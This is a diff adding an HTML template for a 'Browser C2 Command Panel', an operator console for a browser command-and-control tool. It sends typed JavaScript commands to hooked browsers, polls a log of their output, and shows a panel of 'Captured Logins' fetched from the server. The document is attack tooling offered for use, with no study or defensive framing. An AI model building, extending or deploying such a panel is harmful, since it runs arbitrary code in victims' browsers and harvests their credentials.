@@ -1,0 +1,55 @@
+
+<!-- templates/command_panel.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Browser C2 Command Panel</title>
+    <style>
+        body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
+        textarea, input { width: 100%; margin: 5px 0; background: #222; color: #eee; border: 1px solid #444; }
+        button { background: #444; color: #fff; padding: 10px; margin: 5px 0; cursor: pointer; border: none; }
+        .log { background: #000; padding: 10px; border: 1px solid #333; height: 200px; overflow-y: scroll; }
+    </style>
+</head>
+<body>
+    <h2>🧩 Browser Command Panel</h2>
+    <form id="cmdForm">
+        <textarea id="cmdInput" rows="5" placeholder="Enter JavaScript command..."></textarea>
+        <button type="submit">Send Command</button>
+    </form>
+    <h3>📝 Output Log</h3>
+    <div class="log" id="outputLog">[waiting for beacons]</div>
+
+    <script>
+        const log = document.getElementById("outputLog");
+        const cmdForm = document.getElementById("cmdForm");
+        const cmdInput = document.getElementById("cmdInput");
+
+        cmdForm.onsubmit = async (e) => {
+            e.preventDefault();
+            await fetch("/c2/set_command/", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ command: cmdInput.value })
+            });
+            log.innerHTML += "<div>📤 Sent: " + cmdInput.value + "</div>";
+        };
+
+        setInterval(async () => {
+            let res = await fetch("/c2/logs/");
+            let text = await res.text();
+            log.innerHTML = text;
+        }, 5000);
+    </script>
+</body>
+</html>
+
+<h3>🔑 Captured Logins</h3>
+<div class="log" id="loginLog">[waiting for logins]</div>
+<script>
+setInterval(async () => {
+    let res = await fetch("/c2/login_log/");
+    let text = await res.text();
+    document.getElementById("loginLog").innerHTML = text;
+}, 5000);
+</script>
